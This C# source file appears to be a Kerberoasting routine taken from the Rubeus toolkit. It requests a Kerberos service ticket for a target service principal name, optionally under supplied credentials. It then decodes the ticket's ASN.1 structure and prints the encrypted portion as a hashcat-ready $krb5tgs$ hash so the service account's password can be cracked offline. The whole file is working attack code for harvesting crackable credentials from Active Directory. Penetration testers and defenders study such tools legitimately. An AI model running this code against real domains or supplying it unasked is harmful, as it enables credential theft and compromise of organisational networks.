using System;
using Asn1;
using System.Text.RegularExpressions;
using System.Security.Principal;

namespace RubeusRoast
{
    public class Roast
    {
        public static bool GetTGSRepHash(string tLDAP, string tSPN, System.Net.NetworkCredential cred = null)
        {
            string spn = tSPN;

            // extract the username from the target LDAP query
            Match uMatch = Regex.Match(tLDAP, "(?<User>CN=.*)", RegexOptions.IgnoreCase);
            string userDN = uMatch.Groups["User"].ToString();
            string user = userDN.Replace("CN=", "");
            user = user.Substring(0, user.IndexOf(','));
            string userName = user.ToLower();

            // extract the domain name from the target LDAP query
            Match dnMatch = Regex.Match(tLDAP, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
            string domainDN = dnMatch.Groups["Domain"].ToString();
            string domain = domainDN.Replace("DC=", "").Replace(',', '.');

            try
            {
                // the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach and extraction of the AP-REQ from the
                //  GetRequest() stream was constributed to PowerView by @machosec
                System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
                if (cred != null)
                {
                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());
                }
                else
                {
                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
                }
                byte[] requestBytes = ticket.GetRequest();

                if (!((requestBytes[15] == 1) && (requestBytes[16] == 0)))
                {
                    Console.WriteLine("\r\n[X] GSSAPI inner token is not an AP_REQ.\r\n");
                    return false;
                }

                // ignore the GSSAPI frame
                byte[] apReqBytes = new byte[requestBytes.Length - 17];
                Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);

                AsnElt apRep = AsnElt.Decode(apReqBytes);

                if (apRep.TagValue != 14)
                {
                    Console.WriteLine("\r\n[X] Incorrect ASN application tag.  Expected 14, but got {0}.\r\n", apRep.TagValue);
                }

                long encType = 0;

                foreach (AsnElt elem in apRep.Sub[0].Sub)
                {
                    if (elem.TagValue == 3)
                    {
                        foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                        {
                            if (elem2.TagValue == 3)
                            {
                                foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                {
                                    if (elem3.TagValue == 0)
                                    {
                                        encType = elem3.Sub[0].GetInteger();
                                    }

                                    if (elem3.TagValue == 2)
                                    {
                                        byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                        string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
                                        string hash = "";

                                        if ((encType == 18) || (encType == 17))
                                        {
                                            //Ensure checksum is extracted from the end for aes keys
                                            int checksumStart = cipherText.Length - 24;
                                            //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.
                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
                                        }
                                        //if encType==23
                                        else
                                        {
                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
                                        }
                                            Console.WriteLine("[*] Hash                   : {0}", hash);
                                            Console.WriteLine();
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n [X] Error during request for SPN {0} : {1}\r\n", spn, ex.InnerException.Message);
                return false;
            }
            return true;
        }
    }
}
